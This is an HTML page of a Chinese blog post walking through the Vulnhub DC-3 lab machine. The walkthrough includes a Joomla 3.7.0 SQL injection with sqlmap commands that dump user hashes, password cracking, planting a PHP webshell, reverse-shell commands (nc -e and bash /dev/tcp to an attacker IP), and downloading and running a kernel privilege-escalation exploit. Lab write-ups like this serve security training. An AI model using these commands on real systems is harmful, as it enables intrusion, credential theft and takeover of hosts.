@@ -1,0 +1,817 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    [Vulnhub靶机通关]DC-3 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="[TOC] 下载镜像，导入虚拟机，改为NAT模式，启动DC-3时会报个小错  解决方法：here  外网渗透  主机发现+端口扫描 1nmap -sn 192.168.139.0&#x2F;24  锁定为192.168.139.131 详细信息扫描： 1nmap -sS -T5 -sC -p- --min-rate 10000 192.168.139.131  开了web服务，是一个CMS-Joomla">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[Vulnhub靶机通关]DC-3">
+<meta property="og:url" content="http://example.com/2026/01/26/[Vulnhub%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3]DC-3/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="[TOC] 下载镜像，导入虚拟机，改为NAT模式，启动DC-3时会报个小错  解决方法：here  外网渗透  主机发现+端口扫描 1nmap -sn 192.168.139.0&#x2F;24  锁定为192.168.139.131 详细信息扫描： 1nmap -sS -T5 -sC -p- --min-rate 10000 192.168.139.131  开了web服务，是一个CMS-Joomla">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2026/01/26/images/image-20260126225300701.png">
+<meta property="og:image" content="http://example.com/2026/01/26/images/image-20260126225429342.png">
+<meta property="og:image" content="http://example.com/2026/01/26/images/image-20260126225523826.png">
+<meta property="og:image" content="http://example.com/2026/01/26/images/image-20260126225628833.png">
+<meta property="og:image" content="http://example.com/2026/01/26/images/image-20260126235450026.png">
+<meta property="og:image" content="http://example.com/2026/01/26/images/image-20260126235940742.png">
+<meta property="og:image" content="http://example.com/2026/01/26/images/image-20260127000609382.png">
+<meta property="og:image" content="http://example.com/2026/01/26/images/image-20260127001326463.png">
+<meta property="og:image" content="http://example.com/2026/01/26/images/image-20260127001459482.png">
+<meta property="og:image" content="http://example.com/2026/01/26/images/image-20260127001549773.png">
+<meta property="og:image" content="http://example.com/2026/01/26/images/image-20260127001947153.png">
+<meta property="og:image" content="http://example.com/2026/01/26/images/image-20260127002715707.png">
+<meta property="og:image" content="http://example.com/2026/01/26/images/image-20260127003005791.png">
+<meta property="og:image" content="http://example.com/2026/01/26/images/image-20260127003112342.png">
+<meta property="og:image" content="http://example.com/2026/01/26/images/image-20260127004753463.png">
+<meta property="og:image" content="http://example.com/2026/01/26/images/image-20260127004126173.png">
+<meta property="og:image" content="http://example.com/2026/01/26/images/image-20260127004732532.png">
+<meta property="og:image" content="http://example.com/2026/01/26/images/image-20260127004512522.png">
+<meta property="og:image" content="http://example.com/2026/01/26/images/image-20260127005358363.png">
+<meta property="og:image" content="http://example.com/2026/01/26/images/image-20260127005628567.png">
+<meta property="og:image" content="http://example.com/2026/01/26/images/image-20260127005817653.png">
+<meta property="og:image" content="http://example.com/2026/01/26/images/image-20260127010628222.png">
+<meta property="og:image" content="http://example.com/2026/01/26/images/image-20260127010816978.png">
+<meta property="og:image" content="http://example.com/2026/01/26/images/image-20260127010848362.png">
+<meta property="og:image" content="http://example.com/2026/01/26/images/image-20260127011236753.png">
+<meta property="og:image" content="http://example.com/2026/01/26/images/image-20260127011327336.png">
+<meta property="article:published_time" content="2026-01-26T13:25:25.000Z">
+<meta property="article:modified_time" content="2026-01-27T06:41:12.510Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="Vulnhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2026/01/26/images/image-20260126225300701.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="[Vulnhub靶机通关]DC-3">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">[Vulnhub靶机通关]DC-3</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.</span> <span class="toc-text"> 外网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.</span> <span class="toc-text"> 主机发现+端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#joomla370-sql%E6%B3%A8%E5%85%A5nmapjoomscannikto"><span class="toc-number">1.2.</span> <span class="toc-text"> Joomla3.7.0 SQL注入（nmap&#x2F;Joomscan&#x2F;nikto）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#john%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81"><span class="toc-number">1.3.</span> <span class="toc-text"> John爆破密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell"><span class="toc-number">1.4.</span> <span class="toc-text"> 文件上传getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text"> 后渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#linux-exploit-suggester%E6%8F%90%E6%9D%83"><span class="toc-number">2.1.</span> <span class="toc-text"> Linux-Exploit-Suggester提权</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-[Vulnhub靶机通关]DC-3" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2026/01/26/%5BVulnhub%E9%9D%B6%E6%9C%BA%E9%80%9A%E5%85%B3%5DDC-3/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2026-01-26T13:25:25.000Z" itemprop="datePublished">2026-01-26</time>
+    <time style="display: none;" id="post-update-time">2026-01-27</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F/" data-aos="zoom-in">渗透</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>[TOC]</p>
+<p>下载镜像，导入虚拟机，改为NAT模式，启动DC-3时会报个小错</p>
+<p><img src="../images/image-20260126225300701.png" alt="image-20260126225300701" /></p>
+<p>解决方法：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Aluxian_/article/details/123677000">here</a></p>
+<h2 id="外网渗透"><a class="markdownIt-Anchor" href="#外网渗透"></a> 外网渗透</h2>
+<h3 id="主机发现端口扫描"><a class="markdownIt-Anchor" href="#主机发现端口扫描"></a> 主机发现+端口扫描</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.139.0/24</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260126225429342.png" alt="image-20260126225429342" /></p>
+<p>锁定为<code>192.168.139.131</code></p>
+<p>详细信息扫描：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -T5 -sC -p- --min-rate 10000 192.168.139.131</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260126225523826.png" alt="image-20260126225523826" /></p>
+<p>开了web服务，是一个CMS-Joomla</p>
+<h3 id="joomla370-sql注入nmapjoomscannikto"><a class="markdownIt-Anchor" href="#joomla370-sql注入nmapjoomscannikto"></a> Joomla3.7.0 SQL注入（nmap/Joomscan/nikto）</h3>
+<p>访问</p>
+<p><img src="../images/image-20260126225628833.png" alt="image-20260126225628833" /></p>
+<p>用nmap探测一下：（或者用Joomla专门的扫描工具<strong>Joomscan</strong>，或者还能用<strong>nikto</strong>，但这两个工具只能探测出存在<code>/administrator</code>目录和Joomla指纹）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=vuln -p80 192.168.139.131</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">joomscan --url http://192.168.139.131/f<span class="string">&#x27;d&#x27;</span>s</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">nikto --url http://192.168.233.179/</span></span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260126235450026.png" alt="image-20260126235450026" /></p>
+<p><img src="../images/image-20260126235940742.png" alt="image-20260126235940742" /></p>
+<p>发现是<code>Joommla 3.7.0</code>，且探测出来了存在SQL注入漏洞</p>
+<p>既然我们知道了CMS版本号，那直接去MSF里找这个漏洞</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit joomla 3.7.0</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260127000609382.png" alt="image-20260127000609382" /></p>
+<p>找到SQL注入漏洞了，Kali的exploits路径为<code>/usr/share/exploitdb/exploits</code>，Joomla3.7.0 exp信息路径为<code>php/webapps/42033.txt</code>，直接读</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-<span class="section">[~]</span></span><br><span class="line">└─<span class="comment"># cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</span></span><br><span class="line"><span class="comment"># Exploit Title: Joomla 3.7.0 - Sql Injection</span></span><br><span class="line"><span class="comment"># Date: 05-19-2017</span></span><br><span class="line"><span class="comment"># Exploit Author: Mateus Lino</span></span><br><span class="line"><span class="comment"># Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</span></span><br><span class="line"><span class="comment"># Vendor Homepage: https://www.joomla.org/</span></span><br><span class="line"><span class="comment"># Version: = 3.7.0</span></span><br><span class="line"><span class="comment"># Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux</span></span><br><span class="line"><span class="comment"># CVE : - CVE-2017-8917</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">URL Vulnerable: http://localhost/index.php?<span class="attr">option</span>=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%<span class="number">27</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Using Sqlmap:</span><br><span class="line"></span><br><span class="line">sqlmap -u &quot;http://localhost/index.php?<span class="attr">option</span>=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml<span class="string">&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Parameter: list[fullordering] (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: Boolean-based blind - Parameter replace (DUAL)</span></span><br><span class="line"><span class="string">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: error-based</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)</span></span><br><span class="line"><span class="string">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Type: AND/OR time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 time-based blind - Parameter replace (substraction)</span></span><br><span class="line"><span class="string">    Payload: option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu) </span></span><br></pre></td></tr></table></figure>
+<p>找到POC：一个报错注入</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml%27</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">sqlmap -u <span class="string">&quot;http://192.168.139.131/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot;</span> --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</span></span><br></pre></td></tr></table></figure>
+<p>这里用sqlmap命令跑一下</p>
+<p><img src="../images/image-20260127001326463.png" alt="image-20260127001326463" /></p>
+<p>跑出数据库了，跑一下当前使用的库：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.139.131/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --current-db</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260127001459482.png" alt="image-20260127001459482" /></p>
+<p>是joomladb</p>
+<p>跑一下它里面的表：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.139.131/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D &quot;joomladb&quot; --tables</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260127001549773.png" alt="image-20260127001549773" /></p>
+<p>跑<code>_users</code>这个表</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.139.131/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D &quot;joomladb&quot; --tables -T &quot;#__users&quot; --columns</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>注意：第一个选项，直接回车使用默认的“Y”</p>
+<p>第一个选项，直接回车使用默认的“Y”</p>
+<p>第三个选项随意</p>
+<p>第四个选项使用10线程</p>
+</blockquote>
+<p><img src="../images/image-20260127001947153.png" alt="image-20260127001947153" /></p>
+<p>爆username和password</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.139.131/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D &quot;joomladb&quot; --tables -T &quot;#__users&quot; --columns -C &quot;username,password&quot; --dump</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260127002715707.png" alt="image-20260127002715707" /></p>
+<p>得到admin和加密的密码</p>
+<h3 id="john爆破密码"><a class="markdownIt-Anchor" href="#john爆破密码"></a> John爆破密码</h3>
+<p>把密码写入一个文件，然后john 1.txt得到密码<code>snoopy</code></p>
+<p><img src="../images/image-20260127003005791.png" alt="image-20260127003005791" /></p>
+<p>结合之前的/administrator，直接登录：<br />
+<img src="../images/image-20260127003112342.png" alt="image-20260127003112342" /></p>
+<blockquote>
+<p>不过我才发现，我直接访问/administrator，然后爆破密码一样能爆出来…多此一举了噢</p>
+</blockquote>
+<h3 id="文件上传getshell"><a class="markdownIt-Anchor" href="#文件上传getshell"></a> 文件上传getshell</h3>
+<p>哐哐一顿找，找到个既能文件上传又能编辑模板的地方：<br />
+<img src="../images/image-20260127004753463.png" alt="image-20260127004753463" /></p>
+<p>不管是上传木马还是修改源码，我们都需要知道当前目录</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/templates/beez3/html</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260127004126173.png" alt="image-20260127004126173" /></p>
+<p>然后我们直接在html目录下新建一个shell.php，写上一句话</p>
+<p><img src="../images/image-20260127004732532.png" alt="image-20260127004732532" /></p>
+<p><img src="../images/image-20260127004512522.png" alt="image-20260127004512522" /></p>
+<p>哥斯拉连接，再反弹个shell到kali（这里我纯纯自讨苦吃）</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 9999</span><br><span class="line">nc -e /bin/bash 192.168.139.141 9999</span><br></pre></td></tr></table></figure>
+<p><code>-e</code>参数不可用???</p>
+<p>用bash</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.139.141/9999 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260127005358363.png" alt="image-20260127005358363" /></p>
+<h2 id="后渗透"><a class="markdownIt-Anchor" href="#后渗透"></a> 后渗透</h2>
+<h3 id="linux-exploit-suggester提权"><a class="markdownIt-Anchor" href="#linux-exploit-suggester提权"></a> Linux-Exploit-Suggester提权</h3>
+<p>权限太低了，尝试提权</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260127005628567.png" alt="image-20260127005628567" /></p>
+<p>SUID没找到可以用的，sudo显示tty不完整</p>
+<p>建立交互式shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">&lt;/templates/beez3/html$ python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;   </span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260127005817653.png" alt="image-20260127005817653" /></p>
+<p>额，也没用，要密码</p>
+<p>换个思路，用<a target="_blank" rel="noopener" href="https://github.com/mzet-/linux-exploit-suggester%E6%9D%A5%E6%8E%A2%E6%B5%8B%E4%B8%80%E4%B8%8B%EF%BC%9A">https://github.com/mzet-/linux-exploit-suggester来探测一下：</a><br />
+把脚本上传上去</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x linux-exploit-suggester.sh</span><br><span class="line">./linux-exploit-suggester.sh</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260127010628222.png" alt="image-20260127010628222" /></p>
+<p>发现了很多漏洞，这里我们选CVE-2016-4557</p>
+<p>这里给出了POC下载地址</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260127010816978.png" alt="image-20260127010816978" /></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip 39772.zip</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260127010848362.png" alt="image-20260127010848362" /></p>
+<p>解压exploit.tar文件</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -xvf exploit.tar</span><br></pre></td></tr></table></figure>
+<p>进入目录，按照39772.txt文件中的提示方式进行操作</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd ebpf_mapfd_doubleput_exploit</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./compile.sh</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./doubleput</span></span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20260127011236753.png" alt="image-20260127011236753" /></p>
+<p>提权成功了，食在精彩</p>
+<p><img src="../images/image-20260127011327336.png" alt="image-20260127011327336" /></p>
+<p>flag在/root下</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
